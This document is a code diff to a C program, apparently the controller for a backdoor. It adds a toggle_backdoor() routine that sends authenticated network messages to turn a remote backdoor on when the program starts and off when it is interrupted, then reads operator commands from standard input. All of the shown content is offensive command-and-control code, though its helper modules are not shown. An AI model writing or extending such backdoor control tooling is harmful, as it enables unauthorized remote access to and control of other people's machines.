@@ -1,10 +1,33 @@
-#include "nyatta.h"
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <sys/types.h>
+#include <curl/curl.h>
+
+#include "config.h"
+#include "constants.h"
+#include "logger.h"
+#include "crypto.h"
+#include "network.h"
+#include "message.h"
 
 static char *line = NULL;
+static int message_id = 0;
+
+static void toggle_backdoor(int message_id, int command_type)
+{
+  unsigned char message[BUF_SIZE], buf[BUF_SIZE];
+
+  generate_rand_string(buf, 24);
+  craft_message(message, AUTH_HEADER, message_id, command_type, buf, 24);
+  send_request(message);
+}
 
 static void cleanup()
 {
   free(line);
+  toggle_backdoor(message_id, TYPE_SUSPEND_BACKDOOR);
   curl_global_cleanup();
   exit(EXIT_SUCCESS);
 }
@@ -13,14 +36,14 @@ int main()
 {
   ssize_t n;
   size_t len = 0;
-  int ciphertext_len, message_id, command_type;
-  // TODO: calculate proper buffer sizes
-  unsigned char ciphertext_hex[BUF_SIZE], ciphertext[BUF_SIZE], message[BUF_SIZE];
+  int ciphertext_len, command_type;
+  unsigned char ciphertext_hex[DATA_BUF_SIZE], ciphertext[DATA_BUF_SIZE], message[DATA_BUF_SIZE];
   curl_global_init(CURL_GLOBAL_DEFAULT);
 
   signal(SIGINT, cleanup);
 
-  message_id = 0;
+  toggle_backdoor(message_id, TYPE_INVOKE_BACKDOOR);
+  message_id++;
   while ((n = getline(&line, &len, stdin)) != -1)
   {
     // remove newline
